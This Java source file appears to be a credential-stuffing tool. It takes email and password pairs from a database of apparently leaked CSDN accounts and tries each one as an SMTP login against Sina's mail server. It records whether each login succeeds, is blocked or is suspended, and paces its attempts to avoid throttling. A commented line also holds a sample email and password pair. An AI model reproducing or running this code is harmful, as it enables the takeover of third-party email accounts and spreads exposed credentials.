package org.shil.testcsdnetc.detect;

import java.util.Calendar;
import java.util.List;
import java.util.Properties;

import javax.mail.Session;
import javax.mail.Transport;

import org.shil.testcsdnetc.db.CsdnAccountDaoImpl;
import org.shil.testcsdnetc.entity.CsdnAccount;

import com.sun.mail.util.MailConnectException;

public class EmailSinaDetect {

	public static int testSinamail(String email,String password){
		
		int status = 0;
		
		Properties props = new Properties();
		
		//开启debug调试  
//		props.setProperty("mail.debug","true");
		
		//发送服务器需要身份验证  
		props.setProperty("mail.smtp.auth","true");
		//设置邮件服务器主机名  
		props.setProperty("mail.host","smtp.sina.com");
//		props.setProperty("mail.smtp.host","smtp.163.com");
		//发送邮件协议名称  
		props.setProperty("mail.transport.protocol","smtp");
		
//		props.put("mail.smtp.port", "25"); //google使用465或587端口
//		props.put("mail.smtp.starttls.enable","true"); //使用 STARTTLS安全连接:

		//设置环境信息  
		Session session = Session.getInstance(props);
		Transport transport;

		try {
			transport = session.getTransport();
			//连接邮件服务器
			transport.connect(email.substring(0,email.indexOf("@")), password);
			
			System.out.println(email +"Result is " + transport.isConnected());
			
			if(transport.isConnected()){
				status = 1;
			}else{
				//should not in here, expception out
				System.out.println("warning should not here forever!");
				status = 2;
			}
		} catch(MailConnectException em){
//			em.printStackTrace();
			try {
				System.out.println("timeout sleep 98765");
				Thread.sleep(98765);
			} catch (InterruptedException e1) {
				e1.printStackTrace();
			}
		} catch (Exception e) {
//			e.printStackTrace();
			if(e.getMessage().contains("535")){
				//password changed
				status = 2;
			}else if(e.getMessage().contains("550 User has no permission")){
				//not open smtp, can retry in web page.
				status = 3;
			}else if(e.getMessage().contains("550 User is suspended")){
				//not open smtp, can retry in web page.
				status = 4;
			}else if(e.getMessage().contains("550")){
				System.out.println(e.getMessage());
				//550 has a lot of meaning
				status = 550;
			}else if (e.getMessage().contains("554")) {
				System.out.println(e.getMessage());
				// 554 ip was block
				status = 554;
			}else{
				System.out.println("what is this? 999");
				e.printStackTrace();
				//what is this?
				status = 999;
			}
		}

		return status;
	}
	
	public static void testAllSinaAccount(){
		long offset = 0;
		long pagesize = 34;
		List<CsdnAccount> cas = null;
		do{
			cas =CsdnAccountDaoImpl.listCsdnAccounts("sina.com",0,pagesize);
			offset += pagesize;
			for(CsdnAccount ca : cas){
				ca.setStatus(testSinamail(ca.getEmail(),ca.getPassword()));
				CsdnAccountDaoImpl.updateCsdnAccountStatusById(ca.getId(),ca.getStatus());
				if(ca.getStatus()==1){
					System.out.println("got it:" + ca);
				}else{
					System.out.println(Calendar.getInstance().getTime()+ " :  sorry to fail : "+ ca.getEmail());
				}
				
				try {
					Thread.sleep(45678);
				} catch (InterruptedException e) {
					e.printStackTrace();
				}
			}
			
			System.out.println(Calendar.getInstance().getTime()+ " : "+ offset +"/347859");
			
			try {
				Thread.sleep(56789);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
		}while(!cas.isEmpty());
		
	}

	public static void main(String[] args) {
		testAllSinaAccount();
//		System.out.println(testSinamail("bullman2009@sina.com","bullman2009"));
	}

}
